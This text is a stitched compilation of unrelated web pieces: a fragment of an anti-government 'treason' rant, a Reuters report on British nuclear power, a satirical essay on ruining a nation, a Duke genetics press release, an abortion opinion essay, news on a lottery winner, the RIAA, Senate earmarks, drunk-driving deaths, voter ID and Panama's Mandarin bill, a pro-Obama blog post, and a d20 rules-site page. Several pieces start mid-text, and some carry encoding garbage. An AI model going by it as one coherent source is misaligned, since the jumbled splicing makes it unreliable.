Americans would not be fighting government , they would be fighting the Traitorous ï¿ ½Chain of Command for Treasonï¿ ½ and their Foreign Invaders who are usurping our government .
I do not advocate or support armed conflict , nor will I participate in it because it is not necessary unless our Sovereignty , Constitutional Government and Rule of Law are stolen from us .
My prayer is that we can use the Rule of Law and our Constitution to save this country from bloodshed .
( Repeats to widen distribution )
LONDON , Jan 10 ( Reuters ) - Britain gave the go - ahead to a new generation of nuclear power stations on Thursday , setting no limits on nuclear expansion and adding momentum to atomic energy ’s worldwide renaissance .
The ruling Labour government considered nuclear power unattractive as recently as 2003 but now says it will help Britain meet its climate change goals and avoid overdependence on imported energy amid dwindling North Sea supplies .
Nuclear power stations provide about 18 percent of Britain ’s electricity now , but many are nearing the end of their lives .
Energy Secretary John Hutton said the evidence in support of new nuclear stations was compelling and he would not set a limit on the construction of new plants .
“ I therefore invite energy companies to bring forward plans to build and operate new nuclear power stations , ” he told parliament .
Nuclear operators welcomed the move and announced plans for at least four new reactors .
British Energy BGY.L , which already runs eight UK reactors , said it was " positioned to move quite rapidly " to get plants running by late 2017 .
Environmental group Greenpeace , which succeeded in blocking an earlier pro-nuclear decision , said the public had been misled during recent consultations and its lawyers were already considering a fresh challenge .
“ This is bad news for Britain ’s energy security and bad news for our efforts to beat climate change , ” Greenpeace Executive Director John Sauven said , adding that government plans to store highly radioactive waste underground were not safe .
RENAISSANCE
Nuclear power is on the verge of a renaissance , having remained unchanged at 16 percent of the global mix for the last 20 years , when the Chernobyl disaster curbed its growth .
It is now becoming more competitive amid surging prices for oil and gas and buoyed by the need to cut carbon emissions to fight climate change .
Already , countries such as France and Finland are building new nuclear plants and , in the United States , companies have begun filing licence applications , reinforcing the view atomic energy is part of the solution to the world ’s energy problems .
Irish energy minister Eamon Ryan called on Thursday for a public debate on whether to reverse a ban on nuclear power in Ireland , which depends on fuel imports and is situated at the very end of Europe ’s gas network .
There is opposition to nuclear among some states , however , including Germany , an anti-nuclear stronghold .
Critics say the toxic waste from nuclear power generation remains a problem for thousands of years and is not worth the risk .
Hutton said the UK would not subsidise any new reactors , but the government would step in to help in case of a catastrophe .
Britain ’s opposition Conservative Party lent its support to the decision and vowed to “ set aside political scrapping ” , but London Mayor Ken Livingstone called the decision “ the mistake of a generation ” .
GLOBAL COMPETITION
Nuclear operators say they could have new plants running in Britain by 2017 , but analysts point to tough global competition for components and experienced nuclear workers .
“ The UK will need to work hard to remain an attractive option , ” said Tony Ward of Ernst & Young , adding that more than 30 reactors were under construction around the world , and over 90 were in the pipeline .
Hutton said he expected several new plants to be running by the mid-2020s and France 's EDF EDF .
PA said it aimed to build four reactors in the UK .
Britain's Centrica CNA.L , France 's Areva CEPFi.PA and Germany's RWE RWEG.DE and E.ON EONG .DE also said they were keen to get involved .
The government green light was accompanied by publication of an Energy Bill to be fast - tracked through parliament with the Climate Change Bill and the Planning Bill .
Hutton said the government would give more support to wind , wave and tidal energy .
The trio of bills form the backbone of the government ’s new energy and climate policy for the next decades .

Such elected representatives will , then , ensure that government fails to fulfill its functions because when government does exhibit such failures , those elected representatives have proven their point .
Instill passivity in the populace .
In a democracy , for instance , a passive electorate will accept the subversion of the government bureaus instituted to serve the people 's interests .
When , for example , functionaries are put in charge of the Environmental Protection Agency who are actively hostile to the environment , a passive nation will countenance such an egregious betrayal of public trust .
But , if you are intent on ruining your nation , do n't stop at one or two such agencies .
Be sure that the Department of Justice is run by people who are fuzzy on the concept of justice , and that the people named to be in charge of guarding the nation 's public airways and media outlets are actively working for media monopolists who restrict the public uses of those airways and outlets .
Be sure that your intelligence - gathering agencies spend much of their time spying on the citizenry , and that any foreign intelligence they turn up is first weighed and evaluated for possible political consequences to those in power .
Intelligence inimical to the interests of those in power shall be excised or redrafted accordingly .
This same approach should also be applied to the findings of scientists .
When and if scientific evidence reveals data injurious to political or pecuniary interests of the nation 's rulers , then that science will be identified as junk and will , accordingly , be junked in favor of science purchasable from science vendors already in corporate employ .
Trivialize news and information until reporting about the activities of minor entertainment figures is equal to reporting about the decisions that are affecting the lives of the citizenry .
Employ a network of disinformation specialists on radio and TV whose role it is to simplify all matters of national consequence , and to turn global disputes into clashes of good and evil , with all acts of your government cast as good , and all contrary acts portrayed as evil .
If you have created a sufficiently ignorant populace through the work of your schools and your media , such a rendering of reality will be readily accepted by the governed .
If possible -- and it is always possible -- create an external threat , and use that threat to sow a permeating atmosphere of fear .
Tweak this fear whenever it is necessary to distract the public from anything you want to escape their attention .
And keep that public attention scattered and antic .
Manipulating the various media will make this easy , as will the endemic obsession with celebrities and trendiness fostered and fed by those media .
Intrude religion into all public discourse as often as possible , and blur the distinctions between church and state .
This has multiple advantages .
Religion can be used to bathe the most venal acts in heaven - sanctioned righteousness .
Religious zealots can be counted upon to respond to the code phrases that indicate that the nation 's leaders share their zealotry , and religious disputes can also serve as a distraction from the things that put the aims and desires of the powerful ahead of the interests of the country .
Always manipulate the language , affixing labels to those who oppose your policies , repeating those labels in negative contexts until each of them retains the power to convey evil or harm simply by invoking them .
Positive connotations are as useful as negative connotations , so select words that associate policies with generally cherished values and attitudes .
If you wish to strengthen domestic spying , for instance , push your objectives by lumping such activities under rubrics like " homeland " or " security , " the kinds of words no one is ever against .
Waste is profit .
Maintaining power -- and ruining a perfectly good nation -- is dependent upon waste because government waste generates the profits that line the pockets of those whose largesse keeps you in power .
The biggest bull in the herd of sacred cows is the military .
Bolster that bull land gild that sacred cow .
The gilding of the military begins and ends with the image of the foot soldier , the grunt , the G.I .
Once " our boys , " or " our brave men and women in uniform " have been properly gilded and enshrined , it is imperative that you associate yourself with those soldiers in every way you can , always taking pains to blur the distinction between the soldiers and the politicians who have put them at risk .
One way to accomplish this blurring is by highly publicized behind - the - lines visits to media - friendly sites where you can be photographed sharing a safe meal with soldiers before hastening back to the nation 's capital .
Always amplify division between people and contending interests , driving wedges between races and ethnic groups , remembering to pit working people against one another whenever possible -- and it 's always possible .
Xenophobia will trump self - interest if you have been successful at maintaining the level of ignorance necessary to ruining the country for the benefit of yourself and your powerful associates .
Provide no models for emulation .
Turn athletes into overpaid hucksters and drug abusers , and turn youth culture into a megaphone for the disaffected and the defeated , make everything venal and ripe for cynicism , turn the anger of the dispossessed back in on themselves in ways that market self destruction and self - punishing rebellion for the profit of media moguls .
Make idealism uncool and unpopular .
Channel the resulting spiritual hunger into illegal but readily available drugs , or into the evangelical religiosity that preys on the desire to have prayers heard for profit , or the aggrandizement of the merchants of messianic mercies .
Pump the people full of high fructose corn syrup , injecting the stuff into nearly everything they eat until they are as swollen as ticks , barely able to squeeze themselves into oversized gas - swilling SUVs for their pilgrimages to the big box stores that sell them all their overworked hearts desire .
Export jobs ; import goods ; borrow heavily from unreliable allies and trading partners .
Ensure the indebtedness of future generations .
Balance no budgets , but pass on the costs of war profiteering and government contracted waste to the children and grandchildren of the taxpaying classes .
Spend taxpayer money as if there 's no tomorrow , and live accordingly , indifferent to any concept of a healthy heritage that would mark your time here , guaranteeing that your memory will occupy a bleak and resentful place in the hearts of those who come after you , left with the debt and the mess you 've bequeathed to them .

Scientists at Duke University have created the first map of imprinted genes throughout the human genome , and they say a modern - day Rosetta stone -- a form of artificial intelligence called machine learning -- was the key to their success .
The study revealed four times as many imprinted genes as had been previously identified .
In classic genetics , children inherit two copies of a gene , one from each parent , and both actively shape how the child develops .
But in imprinting , one of those copies is turned off by molecular instructions coming from either the mother or the father .
This process of " imprinting " information on a gene is believed to happen during the formation of an egg or sperm , and it means that a child will inherit only one working copy of that gene .
That 's why imprinted genes are so vulnerable to environmental pressures :
If the only functioning copy is damaged or lost , there 's no backup to jump in and help out .
Many of the newly - identified imprinted genes lie within genomic regions linked to the development of major diseases like cancer , diabetes , autism , and obesity .
Researchers say that if some of these genes are later shown to be active in these disorders , they may offer clues to better disease prevention or management .
" Imprinted genes have always been something of a mystery , partly because they do n't follow the conventional rules of inheritance , " says Dr. Randy Jirtle , a genetics researcher in the departments of radiation oncology and pathology at Duke and a senior author of the study .
" We 're hoping this new roadmap will help us and others find more information about how these genes affect our health and well - being . "
The technical wizardry needed to find the genes fell to Dr. Alexander Hartemink , the other senior author of the study and an assistant professor in Duke 's department of computer science , and Philippe Luedi , the first author of the study .
They fed sequence data from two types of genes -- ones known to be imprinted and ones believed not to be imprinted -- into a computer and asked it to discover the differences .
This machine learning approach led to an algorithm , which was able -- like the original Rosetta stone -- to decode seemingly impenetrable data , in this case , specific DNA sequences that pointed to the presence of imprinted genes .
" We can't say for certain that we identified all of them , but we think we found a large number , " says Hartemink .

Jirtle , who has studied imprinting for years , notes that imprinting is an epigenetic event , meaning it 's something that can change a gene 's function without altering the sequence of its DNA .
" Imprinted genes are unusually vulnerable to pressures in our environment -- even what we eat , drink , and breathe .
On top of that , epigenetic changes can be inherited .
I do n't think people realize that . "
Several years ago , Jirtle showed that Agouti mice -- normally fat and yellow -- when fed certain dietary supplements , would produce brown , normal weight babies .
The babies ' Agouti genes , the ones responsible for color , were the same as the mother 's , yet they looked different .
" That 's epigenetics in action , " says Jirtle .
It 's estimated that imprinted genes comprise about 1 percent of the human genome , and until now , only several dozen had been identified .
Using their new " Rosetta stone " , however , Jirtle and Hartemink found 156 new likely imprinted genes , and validated two particularly interesting ones on chromosome 8 , where none had been found before .
One of them , KCNK9 , is mostly active in the brain , is known to cause cancer , and may also be linked to bipolar disorder and epilepsy .
The second , DLGAP2 , is a possible bladder cancer tumor suppressor gene .
Hartemink says experiments to confirm that all 156 new genes are truly imprinted -- and not just statistically likely candidates -- will be difficult , mostly because gene expression varies from tissue to tissue and most genes turn on and off over time .
" We 've certainly narrowed the field , but we have a whole lot of work ahead of us . "
This research is published in the December 3 issue of Genome Research .
Grants from the National Institutes of Health , National Science Foundation , U.S. Department of Energy and the Alfred Sloan Foundation supported the research .
Duke colleagues who also contributed to the work include Fred Dietrich , from the department of molecular genetics and microbiology ; Jennifer Weidman , from the department of radiation oncology and Jason Bosko , an undergraduate in the department of computer science .
What makes opposition to abortion the issue it is for each of the GOP presidential candidates is the fact that it is the ultimate “ wedge issue ” -- it is nonnegotiable .
The right - to - life people hold that it is as strong a point of religion as any can be .
It is religious because the Sixth Commandment ( or the Fifth by Catholic count ) says , “ Thou shalt not kill . ”
For evangelical Christians , in general , abortion is murder .
That is why what others think , what polls say , what looks practical does not matter for them .
One must oppose murder , however much rancor or controversy may ensue .
But is abortion murder ?
Most people think not .
Evangelicals may argue that most people in Germany thought it was all right to kill Jews .
But the parallel is not valid .
Killing Jews was killing persons .
It is not demonstrable that killing fetuses is killing persons .
Not even evangelicals act as if it were .
If so , a woman seeking an abortion would be the most culpable person .
She is killing her own child .
But the evangelical community does not call for her execution .
About 10 % of evangelicals , according to polls , allow for abortion in the case of rape or incest .
But the circumstances of conception should not change the nature of the thing conceived .
If it is a human person , killing it is punishing it for something it had nothing to do with .
We do not kill people because they had a criminal parent .
Nor did the Catholic Church treat abortion as murder in the past .
If it had , late - term abortions and miscarriages would have called for treatment of the well - formed fetus as a person , which would require baptism and a Christian burial .
That was never the practice .
And no wonder .
The subject of abortion is not scriptural .
For those who make it so central to religion , this seems an odd omission .
Abortion is not treated in the Ten Commandments -- or anywhere in Jewish Scripture .
It is not treated in the Sermon on the Mount -- or anywhere in the New Testament .
It is not treated in the early creeds .
It is not treated in the early ecumenical councils .
Lacking scriptural guidance , St. Thomas Aquinas worked from Aristotle ’s view of the different kinds of animation -- the nutritive ( vegetable ) soul , the sensing ( animal ) soul and the intellectual soul .
Some people used Aristotle to say that humans therefore have three souls .
Others said that the intellectual soul is created by human semen .
Aquinas denied both positions .
He said that a material cause ( semen ) cannot cause a spiritual product .
The intellectual soul ( personhood ) is directly created by God “ at the end of human generation . ”
This intellectual soul supplants what had preceded it ( nutritive and sensory animation ) .
So Aquinas denied that personhood arose at fertilization by the semen .
God directly infuses the soul at the completion of human formation .
Much of the debate over abortion is based on a misconception -- that it is a religious issue , that the pro-life advocates are acting out of religious conviction .
It is not a theological matter at all .
There is no theological basis for defending or condemning abortion .
Even popes have said that the question of abortion is a matter of natural law , to be decided by natural reason .
Well , the pope is not the arbiter of natural law .
Natural reason is .
John Henry Newman , a 19th century Anglican priest who converted to Catholicism , once wrote that “ the pope , who comes of revelation , has no jurisdiction over nature . ”
The matter must be decided by individual conscience , not by religious fiat .
As Newman said : “ I shall drink to the pope , if you please -- still , to conscience first , and to the pope afterward . ”
If we are to decide the matter of abortion by natural law , that means we must turn to reason and science , the realm of Enlightened religion .
But that is just what evangelicals want to avoid .
Who are the relevant experts here ?
They are philosophers , neurobiologists , embryologists .
Evangelicals want to exclude them because most give answers they do not want to hear .
The experts have only secular expertise , not religious conviction .
They , admittedly , do not give one answer -- they differ among themselves , they are tentative , they qualify .
They do not have the certitude that the religious right accepts as the sign of truth .
So evangelicals take shortcuts .
They pin everything on being pro-life .
But one cannot be indiscriminately pro-life .
If one claimed , in the manner of Albert Schweitzer , that all life deserved moral respect , then plants have rights , and it might turn out that we would have little if anything to eat .
And if one were consistently pro-life , one would have to show moral respect for paramecia , insects , tissue excised during a medical operation , cancer cells , asparagus and so on .
Harvesting carrots , on a consistent pro-life hypothesis , would constitute something of a massacre .
Opponents of abortion will say that they are defending only human life .
It is certainly true that the fetus is human life .
But so is the semen before it fertilizes ; so is the ovum before it is fertilized .
They are both human products , and both are living things .
But not even evangelicals say that the destruction of one or the other would be murder .
Defenders of the fetus say that life begins only after the semen fertilizes the egg , producing an embryo .
But , in fact , two - thirds of the embryos produced this way fail to live on because they do not embed in the womb wall .
Nature is like fertilization clinics -- it produces more embryos than are actually used .
Are all the millions of embryos that fail to be embedded human persons ?
The universal mandate to preserve “ human life ” makes no sense .
My hair is human life -- it is not canine hair , and it is living .
It grows .
When it grows too long , I have it cut .
Is that aborting human life ?
The same with my growing human fingernails .
An evangelical might respond that my hair does not have the potential to become a person .
True .
But semen has the potential to become a person , and we do not preserve every bit of semen that is ejaculated but never fertilizes an egg .
The question is not whether the fetus is human life but whether it is a human person , and when it becomes one .
Is it when it is capable of thought , of speech , of recognizing itself as a person , or of assuming the responsibilities of a person ?
Is it when it has a functioning brain ?
Aquinas said that the fetus did not become a person until God infused the intellectual soul .
A functioning brain is not present in the fetus until the end of the sixth month at the earliest .
Not surprisingly , that is the earliest point of viability , the time when a fetus can successfully survive outside the womb .
Whether through serendipity or through some sort of causal connection , it now seems that the onset of a functioning central nervous system with a functioning cerebral cortex and the onset of viability occur around the same time -- the end of the second trimester , a time by which 99 % of all abortions have already occurred .
Opponents of abortion like to show sonograms of the fetus reacting to stimuli .
But all living cells have electric and automatic reactions .
These are like the reactions of Terri Schiavo when she was in a permanent vegetative state .
Aquinas , following Aristotle , called the early stage of fetal development vegetative life .
The fetus has a face long before it has a brain .
It has animation before it has a command center to be aware of its movements or to experience any reaction as pain .
These are difficult matters , on which qualified people differ .
It is not enough to say that whatever the woman wants should go .
She has a responsibility to consider whether and when she may have a child inside her , not just a fetus .
Certainly by the late stages of her pregnancy , a child is ready to respond with miraculous celerity to all the personal interchanges with the mother that show a brain in great working order .
Given these uncertainties , who is to make the individual decision to have an abortion ?
Religious leaders ?
They have no special authority in the matter , which is not subject to theological norms or guidance .
The state ?
Its authority is given by the people it represents , and the people are divided on this .
Doctors ?
They too differ .
The woman is the one closest to the decision .
Under Roe vs. Wade , no woman is forced to have an abortion .
But those who have decided to have one are able to .
Some objected to Karl Rove ’s use of abortion to cement his ecumenical coalition , on the grounds that this was injecting religion into politics .
The supreme irony is that , properly understood , abortion is not even a religious issue .
But that did not matter to Rove .
All he cared about was that it worked .
For a while .

Snay won $ 10 m through the Massachusetts state lottery
Daniel Snay 's win attracted the attention of the police in Connecticut , where he had lived for many years .
They say he never informed them of his move .
He faces up to five years in prison if convicted of failing to notify authorities of his change of address .
His lawyer says when Snay moved , he registered only in the new state .
" If that is incorrect , we 'll have to fix it , " lawyer Joseph Fabbricotti said .
" He was n't running .
He 's been living here for four years . "
Connecticut police said Snay had not confirmed his address for the Connecticut sex offender registry since 2004 .
" We 're trying to determine when he moved , why he did n't register with us and whether any charges are warranted , " a spokesman said .
' Most dangerous '
Snay paid $ 20 for his " Billion Dollar Blockbuster " scratch ticket at a suburban convenience store in Massachusetts , where he has lived since 2004 .
The 56 - year - old was convicted several times of indecent assault and battery in the 1970s and 1980s , with two of the assaults involving a child under the age of 14 .
But he is not banned from gambling .
He is classified in Massachusetts as a Level 3 offender , which puts him in the category of most dangerous or most likely to reoffend .
It is the second time in recent months that a convicted offender has won the Massachusetts lottery .
In January , a judge allowed a bank robber to keep a $ 1 m lottery prize even though his probation terms forbade him from gambling .
Monsanto , the real and symbolic leader in genetically modified crops , is a company that environmental groups love to hate .
A “ Monsanto +antichrist ” Google search turns up 53,000 hits .
The virtual hate
carries over into the real world , too .
Last month , Monsanto claimed that activists damaged 65 percent of its test fields in 2006 .
And yet , in the last 5 years , Monsanto ’s stock price is up over 700 percent , and the company ’s directors keep snapping up more shares .
But
Americans do n’t eat GE specialty crops , which include vegetables and fruit .
As a 2004 USDA
workshop found :
Relatively few GE specialty crop varieties have been submitted to regulatory agencies for clearance , and most of those that have been approved are not available in the marketplace today …
The number of products in development … is approaching zero .
In August 2006 , the Center for Food Safety released a factsheet that stated , " the depth of market rejection of GE foods is arguably unparalleled by any other consumer product . "
It ’s hard to square these statements with Monsanto's $ 689,000,000 in net income during 2006 .
There are two parts to the explanation of this seeming paradox .
One is that American public opinion is not nearly as hard - edged as the CFS statement suggests .
Scores of polls and surveys by both sides can be reduced to three simple ideas .
One , American consumers know just about nothing about genetic engineering , more than ten years after its introduction into the market .
Two , American consumers intuit that they do n't really want their food genetically modified .
Three , that belief is not very strong for most people , i.e. , one study found that only 2 percent of respondents had done something or " taken action " because of their concerns over biotechnology .
The other part of the explanation is that US consumer attitudes do n't actually matter very much to the current GM food business .
All
Monsanto needs is for you to love Twinkies and Coca - Cola , the food machinery of this country does the rest .
Monsanto ’s model is business - to - business ( B2B ) , like server sales or logistics .
Monsanto is more like Oracle than Apple .
To the average consumer , GM crops are invisible , especially because you do n’t have to label them in the US .
The attitudes towards GMO that matter to Monsanto are those held by big agribusiness seed buyers and corporate farmers , not Joe Six Pack .
And the IT managers of the farming world love Monsanto .
The chart is of US
GE crop adoption of their big three products , corn , soybeans , and cotton , which just happen to compose 75 percent of the revenue generated from non-fruit and vegetable cash crops .
If you ’re an opponent of GM foods , here comes the scary punchline .
A big chunk of all that genetically modified corn and soy go right into our processed foods and into feed for the animals we eat .
So chances are , unless you are a raw or organic foodista , you ate a GM food derivative this very day .

A litigation target of the Recording Industry Association of America has been awarded attorney 's fees after the music business falsely sued an Oregon woman for copyright infringement .
It is the second time a federal judge has awarded defense expenses to an RIAA target who was falsely accused .
In the Oregon case , U.S. District Judge James Redden ruled Tuesday that 42 - year - old Tanya Andersen should be compensated for the costs of her legal defense .
The court did not specify how much to award Andersen , but her lawyers have suggested it was in the hundreds of thousands of dollars .
The RIAA and Andersen 's lawyers must now haggle over compensation , which Redden must approve .
The industry accused her of distributing rap music on the Kazaa file - sharing network , but dropped the 2005 case after concluding the allegations could not be proved .
Although the RIAA dismissed the case , it fought paying legal fees , decrying Andersen as a music thief along the way .
" It would be an extraordinary coincidence indeed if this defendant had nothing to do with infringement at issue in this matter , " RIAA attorney William Patton wrote in a court brief opposing legal costs .
The Copyright Act , under which the RIAA has sued thousands of individuals , allows judges to " award a reasonable attorney 's fee to the prevailing party . "
Judge Redden , in his decision , declared Andersen the " prevailing party . "
The only other time fees were awarded to an RIAA defendant was last year , when an Oklahoma federal judge ordered the RIAA to pay $ 68,685 to two Oklahoma women whose joint case the RIAA brought against them was dismissed for lack of evidence .
But fees to the prevailing party are not automatic , as was illustrated last week when a federal appeals court ruled a Texas man falsely sued for infringement should not be compensated for defending himself .
The 5th U.S. Circuit Court of Appeals held that the RIAA 's case against Cliff Thomas was not " frivolous or objectively unreasonable . "
The court noted that RIAA investigators accurately detected " substantial copyright infringement " on Thompson 's IP address .
As it turned out , Thomas said it was his daughter who did the deed , and the RIAA sued her instead and won a default judgement .
Andersen , in response to being sued , has filed a lawsuit against the RIAA seeking class - action status in Oregon federal court .
The case , which is pending , seeks to represent RIAA defendants who say they have been falsely sued .
The RIAA has sued more than 20,000 for copyright infringement .
Most have settled out of court .
Only one case has gone to trial , and the defendant lost when a jury ordered her to pay $ 222,000 for sharing 24 songs on Kazaa .

I watched the debates tonight .
Then sat in stunned silence for hours as it sank in .
The Democratic debates were instructive and moving .
Edwards reminded me why I liked him so much .
We do need a President who feels down to his very soul the necessity of fighting back , and who has proven himself in battle .
Hillary has been on the other side all too often , grinning her “ Jack Nicholson as the Joker ” grin while sticking a shiv in our backs ( she calls this experience ) .
Edwards is that man , and I still stand beside him as my favorite candidate for President .
But now I am standing firmly in Obama ’s camp as well , and feel a great deal of confidence in Barack ’s ability to lead this country .
He went from “ at least he ’s not Hillary ” to “ I can actually support him ” in just a few moments .
I ’d like to share those essential realizations with you .
The Power of Words .
Inspiration .
In that word is everything Obama is and Hillary is not .
It is everything I aspired to when I taught , and what moves me to care and act and speak out .
Words do matter , and while Hillary tried to cast them aside , Obama brought them back to the table with an appropriate rhetorical deftness .
You see , words matter because they inspire and unite us .
Words move “ we the people ” to action , and it is that action that changes history and brings about change .
Change is n’t just something you legislate or negotiate .
Change is something you incite , something you invite and push and explode and challenge .
And Barack Obama understands this with a fullness not seen in many public figures inside or out of what we label politics .
And people know this .
When we see the candidates , Democrats and Republicans , under the spotlight .
When we hear their words and see their actions , those of us who think and feel with our own minds and hearts are drawn towards Obama ’s authenticity .
Not merely because it is authentic , as some Republicans have dismissively surmised , but because that authenticity promises a shift in political power .
From the elites to all .
Really the only people left are those Republicans who are casting votes of theocratic lust and faith for Huckabee , those casting their lot with the Elephant who can sound the most like Bush without sounding too much like the guy who got us into Iraq and mishandled Katrina .
The only people left are those of sympathetic hearts and minds voting for John Edwards , and those who are casting votes of fear disguised as pragmatism , votes for Hillary Clinton .
And when it comes down to it , the point is n’t that Clinton and the Rest have so much to lose in the face of such hope .
The point is that Obama has so much to gain .
Because as the excitement of real change begins to sweep this country , the unwittingly cynical marketing pushed by Ron Paul supporters , the idea of a revolution , starts becoming more of a reality .
You see the biggest issue facing our country is our representation in government .
And the only way to start to do that is to involve more people in politics .
Part of that means tackling the owners and their lobbyists .
Part of that involves creating time for people to get informed and take action .
But the very start is to invite more people to take part , and Brarack Obama can do that .
He could do that as President , he could do that as Vice President .
He ’s doing it right now , and that is why he is winning .

Senators still boast about bringing home the bacon
While conservative senators have boasted recently about ditching the $ 1 million " hippie museum " earmark from a recent spending bill , they did n't bother touching billions for Louisiana .
Sen. Mary Landrieu ( D - La. ) , in fact , put out a press release late last night declaring Thursday as " our $ 12 billion day . "
Indeed , Louisiana received $ 3 billion in home reconstruction aid that was dropped into the Defense spending bill late in negotiations .
That bill cleared the Senate on Thursday .
Louisiana will receive $ 7 billion of the $ 23 billion water resources development act money thanks to the resounding override of President Bush 's veto of that bill .
And the Pelican State will receive $ 2 billion in defense funds for various military projects and installations in that state under the Pentagon spending bill .
Bringing home the bacon for Louisiana certainly does n't hurt Landrieu , who is the Republicans ' top target in 2008 Senate elections .
But Senate Republicans late on Thursday night decided not to try to jettison Louisiana 's $ 3 billion earmark for the Louisiana Road Home housing recovery program .
Technically speaking , the late addition of that money to the defense spending bill could have violated Senate rules .
But it would only have mattered if someone decided to raise a ruckus on the Senate floor .
According to Senate aides familiar with the behind the scenes negotiations , conservative Republicans backed off a threat to raise a point of order against Landrieu 's money because Democrats agreed to give attorney general nominee Michael Mukasey a quick vote .
Landrieu left the Senate floor late Thursday night with a pile of money for her state .
" The support shown for Louisiana tonight is a powerful demonstration of this Congress ’ commitment to fully funding out state ’s rebuilding from the 2005 hurricanes and levee failures , " Landrieu said .
" We are grateful for the steadfast partnership shown by the many senators without whom tonight ’s victory would have been impossible . "

Facebook ARLINGTON , Va. ( AP )  Drunken driving fatalities increased in 22 states in 2006 and fell in 28 states , the District of Columbia and Puerto Rico , federal transportation officials said Monday .
The National Highway Traffic Safety Administration released data showing there were 13,470 deaths in 2006 involving drivers and motorcycle operators with blood alcohol levels of .08 or higher , which is the legal limit for adults throughout the country .
The number was down slightly from 2005 , when 13,582 people died in crashes involving legally drunk drivers .
The overall number of deaths involving drivers and motorcycle operators with any amount of alcohol in their blood was 17,602 last year .
That was up from 17,590 in 2005 , according to spokeswoman Heather Ann Hopkins .
" The number of people who died on the nation 's roads actually fell last year , " U.S. Transportation Secretary Mary Peters said at a news conference in this Washington suburb .
" However the trend did not extend to alcohol - related crashes . "
Transportation officials announced the new figures as they unveiled a $ 11 million nationwide advertising campaign as part of a Labor Day weekend campaign " Drunk Driving .
Over the Limit. Under Arrest . "
" This crackdown is very , very , very important because it's the penalties that are imposed when someone chooses to ignore the law that really have the ability to make changes , " Peters said .
Among states , Arizona , Kansas and Texas had the greatest increases in number of drunken driving deaths last year .
But Utah , Kansas and Iowa had the largest percentage increases compared with 2005 .
Texas had the largest actual number drunken driving deaths with a total of 1,354 .
Florida , Missouri and Pennsylvania had the greatest decreases in numbers of drunken driving deaths last year , while the District of Columbia , Alaska and Delaware had the largest percentage decreases compared with 2005 .
The District of Columbia had the smallest actual number of drunken driving deaths with a total of 12 .

All of these voters appeared at the polling place for the precinct in which they were registered , and all of the signatures on their provisional - ballot envelopes matched the appropriate poll book signatures .
At least 14 of these voters had voted in 10 elections before last year , according to voting records .
Last year , legislators in 27 states proposed laws like the one in Indiana , seeking to increase identification requirements for registration or voting , according to Justin Levitt , a lawyer for the Brennan Center for Justice at the New York University School of Law .
Mr. Levitt predicted legislative and legal battles in at least that many states , depending on how the Supreme Court ruled .

But the decision will affect more than just the voter - identification issue .
In the 1980s and ’90s , the Supreme Court came up with a test for assessing any law that placed hurdles before voters .
The justices ruled that courts must weigh the value of the law to the state against the burden it placed on voters .
How the court applies that test in this case could set the standard for challenges to election rules across the country .
The decision could affect a range of other voting - related rules being imposed by states , including ones involving the handling of provisional ballots , new restrictions on voter registration and the methods states can use to purge voters from registration rolls .
Professor Tokaji , who was hired by the federal Election Assistance Commission to help produce a report released last year on voter - identification requirements , said that Arizona , for example , would study the court ’s ruling to see whether it could continue to require voters to present either one photo ID or two forms of nonphoto ID .
Similarly , in Ohio , litigation is pending over such matters as how old a utility bill can be for a voter to use it as identification .
Supporters of the law said the requirement was hardly burdensome in today ’s society .
“ It is exceedingly difficult to maneuver in today ’s America without a photo ID ( try flying , or even entering a tall building such as the courthouse in which we sit , without one ) , ” wrote Judge Richard A. Posner in a January 2007 opinion by the Seventh United States Circuit Court of Appeals in Chicago upholding the Indiana law and affirming a 2007 decision by Sarah Evans Barker , a federal district court judge .
“ And as a consequence , the vast majority of adults have such identification . ”
The Panamanian National Assembly has given conditional approval to the bill in the first of three debates .
The bill 's supporters say boosting the number of Chinese speakers will help increase Panama 's competitiveness .
China is the biggest single user of the Panama Canal that connects the Pacific and Atlantic Oceans .
The bill 's supporters recognise that English is the international language of business but say that with China 's increasing economic influence , Mandarin is set to be an indispensable language .
Panama has important commercial links with China , with bilateral trade running at $ 1bn ( £ 500 m ) .
The Central American nation also has diplomatic links with Taiwan , one of the few countries to do so .
The proposed legislation sets out a timeframe of 10 years for Mandarin to be taught in all schools .
The legislation proposes allowing the immigration of specialist Chinese teachers to help train local teachers .
About This Site
The Hypertext d20 SRDTM is intended to be a useful supplement to published rulebooks .
It is not intended to replace them .
I see my gaming library as a valuable collection that I derive much pleasure from .
There is no way that this site could duplicate the experience of reading a beautifully designed and illustrated book .
But , there are some BIG advantages that this site has over printed materials :
Speed
This site is a lightning - fast reference for the d20 system rules you use most .
Speeding up mundane activities ( such as looking up rules ) has a major positive impact on the gaming experience .
There are three ways this site is quicker to use than printed rulebooks :
Hyperlinked Indexes :
When you find a topic in one of these tables of contents , you do n’t have to find a page number , you just click !
: When you find a topic in one of these tables of contents , you do n’t have to find a page number , you just click !
Contextual Hyperlinks ( 56,462 so far ) :
When you ’re reading along , and run across a game term that you do n’t know , just click on it !

Searchability : Do n’t remember where the rules for drowning are located ?
Type it in the search engine !
Durability
You ca n’t wear this site out .
I dare you .
Try it .
The same ca n’t be said of your cherished rulebooks .
Eases Learning
Learning the d20 rule system can be a daunting task for beginners and even the most learned rules scholar needs a refresher now and again .
There are hundreds of game terms that are unfamiliar to the uninitiated .
Now the fledgling gamer can just click on the esoteric jargon instead of flailing and flipping pages .
Accessibility
With surprising frequency people find themselves with access to the internet , but not to their rulebooks .
I 've received emails from soldiers stationed overseas to folks slacking off at work that are happy to have access to d20 rules .
I know of no Braille editions of d20 rulebooks .
This site has been built with accessibility in mind .
If you ’re using a screen reader , or even a palm pilot , this site is built for you .
How to Use This Site
I know .
It sounds pretty silly .
Of course you know how to use a Web site , but read on …
You never know what you may learn .
Add the Home Page to Your Bookmarks Bar
Now you have a Home > xxx button no matter how far you 're scrolled down on a page .
Use Mozilla Firefox
I know this is a big leap for many of you , but Firefox offers several features that really enhance the usefulness and usability of this site .
I 'ts worth downloading Firefox even if you only use it for this site !
This site also uses several W3C standards that are NOT supported by Internet Explorer .
The Hypertext d20 SRD will look better using a compliant browser such as Firefox .
Find As You Type
This Firefox feature really saves time hunting for words and links on a page .
Just hit the slash ( / ) key and start typing your search word .
The first instance of the word is instantly scrolled to and highlighted .
If the word is a hyperlink , just hit the enter key to activate it .
To find the next occurence of the word hit " Ctl - G " ( Cmd - G on a Mac ) .
Here are a couple of examples of this wonderfully useful feature :
Example 1 : Navigate to Hydra stats
You click on " Monsters " from the home page .
You get a nice index of monsters , but egad !
there 's a lot of links .
You type " / hy " and the Hydra link is already selected !
You hit " enter " and you 're there .
Yay !
